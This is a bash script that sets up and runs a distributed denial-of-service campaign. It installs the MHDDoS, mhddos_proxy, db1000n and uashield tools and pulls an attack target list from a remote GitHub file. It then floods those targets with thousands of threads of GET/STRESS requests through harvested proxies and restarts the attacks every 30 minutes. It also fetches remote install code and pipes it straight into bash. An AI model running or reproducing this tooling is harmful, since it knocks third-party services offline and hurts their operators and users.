#!/bin/bash
# curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh && tmux a

clear && echo -e "Loading...\n"

sudo apt-get update -q -y #>/dev/null 2>&1
# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
sudo apt-get install -q -y tmux toilet python3 python3-pip 
pip install --upgrade pip >/dev/null 2>&1

cd ~
rm -rf multidd
mkdir multidd
cd multidd

typing_on_screen (){
    tput setaf 2 &>/dev/null # green
    for ((i=0; i<=${#1}; i++)); do
        printf '%s' "${1:$i:1}"
        sleep 0.06$(( (RANDOM % 5) + 1 ))
    done
    tput sgr0 2 &>/dev/null
}
export -f typing_on_screen

#if launched in docker than variables saved in docker md.sh will be used
if [[ $docker_mode != "true" ]]; then
    gotop="on"
    db1000n="off"
    uashield="off"
    vnstat="off"
    matrix="off"
    proxy_finder="on"
    export uvloop="on"
fi

if [[ $t_set_manual != "on" ]]; then
    export threads="-t 2500"
fi

if [[ $t_proxy_manual != "on" ]]; then
    export proxy_threads="2000"
fi

export methods="--http-methods GET STRESS"

### prepare target files (main and secondary)
prepare_targets_and_banner () {
export targets_curl="/var/tmp/curl.uaripper"
export targets_line_by_line="/var/tmp/line_by_line.uaripper"
export targets_uniq="/var/tmp/uniq.uaripper"
export t1="/var/tmp/xaa.uaripper"
export t2="/var/tmp/xab.uaripper"
export t3="/var/tmp/xac.uaripper"
export t4="/var/tmp/xad.uaripper"
rm -f /var/tmp/*uaripper #remove previous copies

# read targets from github and put them in file $targets_curl. Commented and empty lines excluded.
echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)" | while read LINE; do
    if [[ "$LINE" != "#"* ]] && [ "$LINE" != "" ] ; then
        echo $LINE >> $targets_curl
    fi
done

# put all valid addresses on a new line
for i in $(cat $targets_curl ); do
    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
        echo $i >> $targets_line_by_line
    fi
done

# find only uniq targets, randomize order and save them in $targets_uniq
cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq

#split targets by line in N files
cd /var/tmp/
split -n l/1 --additional-suffix=.uaripper $targets_uniq
cd -

# Print greetings and number of targets (secondary, main, total)
clear
toilet -t --metal "Український" && sleep 0.1
toilet -t --metal "   жнець" && sleep 0.1
toilet -t --metal " MULTIDDOS" && sleep 0.1
typing_on_screen 'Шукаю завдання...'
sleep 0.5
echo -e "\n" && sleep 0.1
echo -e "Total targets found:" "\x1b[32m $(cat $targets_line_by_line | wc -l)\x1b[m" && sleep 0.1
echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
if [[ $threads == "" ]]; then
    echo -e "\nКількість потоків:" "\x1b[32m $(echo "auto" | cut -d " " -f2)\x1b[m" && sleep 0.1
else
    echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
fi
echo -e "\nЗавантаження..."
sleep 3
clear
}
export -f prepare_targets_and_banner

launch () {
# kill previous sessions or processes in case they still in memory
tmux kill-session -t multiddos > /dev/null 2>&1
sudo pkill node > /dev/null 2>&1
sudo pkill shield > /dev/null 2>&1
# tmux mouse support
grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf > /dev/null 2>&1

if [[ $gotop == "on" ]]; then
    if [ ! -f "/usr/local/bin/gotop" ]; then
        curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
        sudo dpkg -i gotop.deb
    fi
    tmux new-session -s multiddos -d 'gotop -sc solarized'
    sleep 0.2
    tmux split-window -h -p 66 'bash auto_bash.sh'
else
    sleep 0.2
    tmux new-session -s multiddos -d 'bash auto_bash.sh'
fi

if [[ $vnstat == "on" ]]; then
sudo apt -yq install vnstat
sleep 0.2
tmux split-window -v 'vnstat -l'
fi

if [[ $db1000n == "on" ]]; then
sudo apt -yq install torsocks
sleep 0.2
tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
fi

if [[ $uashield == "on" ]]; then
sleep 0.2
tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.6/shield-1.0.6.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
fi

if [[ $proxy_finder == "on" ]]; then
sleep 0.2
tmux split-window -v -p 20 'rm -rf ~/multidd/proxy_finder; git clone https://github.com/porthole-ascend-cinnamon/proxy_finder ~/multidd/proxy_finder; cd ~/multidd/proxy_finder; python3 -m pip install -r requirements.txt; clear; echo "Шукаю нові проксі... Proxy threads:" $proxy_threads; echo -e "\x1b[32mВ середньому одна робоча проксі знаходиться після 10млн перевірок\x1b[m"; python3 ~/multidd/proxy_finder/finder.py --threads $proxy_threads'
fi

#tmux -2 attach-session -d
}

usage () {
cat << EOF
usage: bash multiddos.sh [+d|+u|-t|+m|-h]
                    -g | --gotop            - disable gotop
                    -p | --proxy-threads    - threads for proxy finder
                    -p0| --no-proxy-finder  - disable proxy finder
                    +d | --db1000n          - enable db1000n
                    +u | --uashield         - enable uashield
                    +v | --vnstat           - enable vnstat -l (traffic stat)
                    -t | --threads          - threads
                    -h | --help             - brings up this menu
EOF
exit
}

if [[ "$1" = ""  ]]; then launch; fi

while [ "$1" != "" ]; do
    case $1 in
        +d | --db1000n )   db1000n="on"; shift ;;
        +u | --uashield )   uashield="on"; shift ;;
        -t | --threads )   export threads="-t $2"; t_set_manual="on"; shift 2 ;;
        -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
        +v | --vnstat ) vnstat="on"; shift ;;
        -p0| --no-proxy-finder ) export proxy_finder="off"; shift ;;
        -p | --proxy-threads ) export proxy_threads="$2"; shift 2 ;;
        --no-uvloop ) export uvloop="off"; shift ;;
        -h | --help )    usage;   exit ;;
        *  )   usage;   exit ;;
    esac
done

# assign auto calculated threads value if it wasn't assidgned as -t in command line
# threads = number of cores * 150
# if [[ $t_set_manual != "on" ]]; then 
#     if [[ $(nproc --all) -le 8 ]]; then
#         threads="-t $(expr $(nproc --all) "*" 250)"
#     elif [[ $(nproc --all) -gt 8 ]]; then
#         threads="-t 1200"
#     else
#         threads="-t 200" #safe value in case something go wrong
#     fi
# export threads
# fi

prepare_targets_and_banner
clear

# create small separate script to re-launch only this part of code and not the whole thing
cat > auto_bash.sh << 'EOF'
# create swap file if system doesn't have it
if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
    sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
fi

#install mhddos and mhddos_proxy
cd ~/multidd/
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt
git clone https://github.com/MHProDev/MHDDoS.git

if [[ $uvloop == "off" ]]; then
    pip uninstall -y uvloop
fi

# Restart attacks and update targets every 30 minutes
while true; do
        pkill -f start.py; pkill -f runner.py 
        python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
        # sleep 10 # to decrease load on cpu during simultaneous start
        # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
        # sleep 10 # to decrease load on cpu during simultaneous start
        # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
        # sleep 10 # to decrease load on cpu during simultaneous start
        # python3 ~/multidd/mhddos_proxy/runner.py -c $t4 $threads $methods&
sleep 30m
prepare_targets_and_banner
done
EOF

launch